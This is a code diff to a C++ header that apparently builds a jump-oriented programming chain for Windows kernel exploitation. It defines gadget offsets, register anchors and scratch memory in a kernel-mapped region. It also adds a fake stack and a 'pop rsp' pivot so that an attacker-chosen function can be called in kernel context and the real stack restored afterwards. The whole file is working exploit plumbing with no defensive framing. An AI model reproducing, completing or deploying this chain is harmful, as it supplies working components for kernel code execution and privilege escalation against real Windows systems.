@@ -46,15 +46,20 @@ rdx anchor — gadget3 reads new_rax from [rdx+0x1B0]:
 #define KUSD_BASE               0xFFFFF78000000000ULL
 #define KUSD_SCRATCH_OFF        KUSERSHAREDDATA_SIZE        // 0xa80
 
-// All offsets below are relative to KUSD_BASE + KUSD_SCRATCH_OFF
-#define SCRATCH_RSI_BCK         0x00    // [rsi-0x39] -> g4
-#define SCRATCH_RSI_FWD         0xA5    // [rsi+0x66] -> g3   (BCK + 0xA5)
-#define SCRATCH_RAX             0xB0    // [rax-0x35C17] -> g2  (also used as [rdx+0x1B0] base)
-#define SCRATCH_NEW_RAX         0xC0    // new_rax value; gadget3 loads rax from [rdx+0x1B0]
-#define SCRATCH_G3_CONT         0x280   // [new_rax+0x1C0] -> g4  (0xC0 + 0x1C0 = 0x280)
-#define SCRATCH_G4_CONT         0xE8    // [new_rax+0x28]  -> pivot  (0xC0 + 0x28 = 0xE8)
-#define SCRATCH_ALLOC_START     0xF0    // general scratch grows from here
-#define SCRATCH_MAX             (0x1000 - KUSD_SCRATCH_OFF)   // remaining bytes in page
+// All offsets below are relative to scratch base (ntso .data + 0x80000)
+#define SCRATCH_RSI_BCK         0x00
+#define SCRATCH_RSI_FWD         0xA5
+#define SCRATCH_RAX             0xB0
+#define SCRATCH_NEW_RAX         0xC0
+#define SCRATCH_G3_CONT         0x280   // 0xC0 + 0x1C0
+#define SCRATCH_G4_CONT         0xE8    // 0xC0 + 0x28
+#define SCRATCH_POP_RDX         0xF0    // gadget1 call pushes here; gadget2 pops rdx
+#define SCRATCH_ALLOC_START     0x100
+
+// Fake stack — high in scratch so the called function has 256KB to grow downward.
+// [STACK_TOP] holds original_rsp; gadget4 pop rsp restores the real kernel stack.
+#define SCRATCH_STACK_TOP       0x40000
+#define SCRATCH_MAX             0x19A000
 
 struct JopSlot {
     const char* name;
@@ -86,13 +91,15 @@ public:
 
     void Build(UINT64 g1Off, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off);
     void Commit();
-    void SetRestoreRip(UINT64 addr); // sets [newRax+0x28]   — last jump in chain
-    void SetCallTarget(UINT64 addr); // sets [rax-0x35C17]   — address called by gadget1
+    void SetRestoreRip(UINT64 addr);
+    void SetCallTarget(UINT64 addr);
+    void SetOriginalRsp(UINT64 originalRsp); // writes originalRsp to SCRATCH_RSP_SETUP; gadget4 pop rsp restores it
 
     UINT64 GetRax() const { return rax; }
     UINT64 GetRsi() const { return rsi; }
     UINT64 GetRdx() const { return rdx; }
-    UINT64 GetPopRdxValue() const { return rdx; } // push this before firing chain: gadget2 pops it into rdx
+    UINT64 GetPopRdxValue() const { return rdx; }
+    UINT64 GetRspSetupAddr() const { return scratchBase + SCRATCH_STACK_TOP; }
 
     void PrintLayout() const;
 };
